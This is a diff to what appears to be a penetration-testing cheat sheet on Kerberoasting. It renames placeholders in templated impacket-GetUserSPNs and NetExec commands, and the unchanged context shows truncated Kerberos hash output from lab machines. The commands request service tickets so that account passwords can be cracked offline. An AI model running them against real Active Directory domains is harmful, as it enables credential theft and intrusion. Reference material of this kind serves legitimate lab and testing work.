@@ -66,12 +66,12 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 
 ```console
 # With Password
-sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC>
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC>
 ```
 
 ```console
 # With Kerberos
-sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -no-pass -k -dc-host <DC>
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -no-pass -k -dc-host <DC>
 ```
 
 ```console {class="sample-code"}
@@ -93,7 +93,7 @@ $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b62984d5b ---[SNIP]--- f4c2161
 
 ```console
 # Kerberoasting without cred
-sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC> <DOMAIN>/
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC> <DOMAIN>/
 ```
 
 ```console {class="sample-code"}
@@ -110,7 +110,7 @@ $krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$d989a5d49 ---[SNIP]--- 962d2aa2f2
 {{< tabcontent set2 tab2 >}}
 
 ```console
-sudo ntpdate -s <DC> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt
 ```
 
 ```console {class="sample-code"}
